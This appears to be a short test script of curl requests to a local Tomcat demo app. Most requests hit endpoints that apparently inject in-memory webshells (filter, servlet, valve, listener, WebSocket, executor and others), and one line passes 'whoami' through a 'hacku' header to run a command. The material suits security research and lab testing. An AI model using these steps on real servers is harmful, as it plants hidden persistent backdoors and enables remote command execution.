curl -v 'http://localhost:8082/servletDemo_war_exploded/injectTimer'
curl -v 'http://localhost:8082/servletDemo_war_exploded/injectThread'
curl -v 'http://localhost:8082/servletDemo_war_exploded/injectFilter'
curl -v 'http://localhost:8082/servletDemo_war_exploded/injectServlet'
curl -v 'http://localhost:8082/servletDemo_war_exploded/injectUpgrade'
curl -v 'http://localhost:8082/servletDemo_war_exploded/injectValve'
curl -v 'http://localhost:8082/servletDemo_war_exploded/injectWS'
curl -v 'http://localhost:8082/servletDemo_war_exploded/proxyValve.jsp'
curl -v 'http://localhost:8082/servletDemo_war_exploded/injectExecutor' -H "hacku: whoami"


curl -v 'http://localhost:8082/servletDemo_war_exploded/injectListener'